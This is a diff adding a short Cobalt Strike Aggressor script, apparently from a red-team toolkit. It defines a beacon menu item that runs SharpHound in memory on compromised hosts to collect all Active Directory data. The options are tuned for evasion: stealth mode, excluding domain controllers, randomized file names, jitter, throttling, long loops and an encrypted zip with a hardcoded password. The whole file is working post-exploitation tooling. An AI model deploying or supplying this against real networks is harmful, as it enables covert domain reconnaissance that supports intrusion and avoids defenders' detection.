@@ -1,0 +1,13 @@
+item "SharpHound Low and Slow Stealth"{
+local('$bid');
+foreach $bid ($1){
+sharphoundsuperstealth($bid);
+		}
+	} #End Item 
+
+
+sub sharphoundsuperstealth{
+$bid = $1;
+bexecute_assembly($1, script_resource('/exe/SharpHound.exe'), "--CollectionMethod All --CollectAllProperties --nosavecache --EncryptZip Bl00DhounD0gg1234 --ExcludeDomainControllers --RandomizeFileNames --Stealth --Loop --LoopDuration 90000 --LoopInterval 30000 --Throttle 10000 --Jitter 99");
+btask($bid, 'Stealthy Collection of All Properties with zip password of Bl00DhounD0gg1234 be patient - this one WILL take a while');
+}
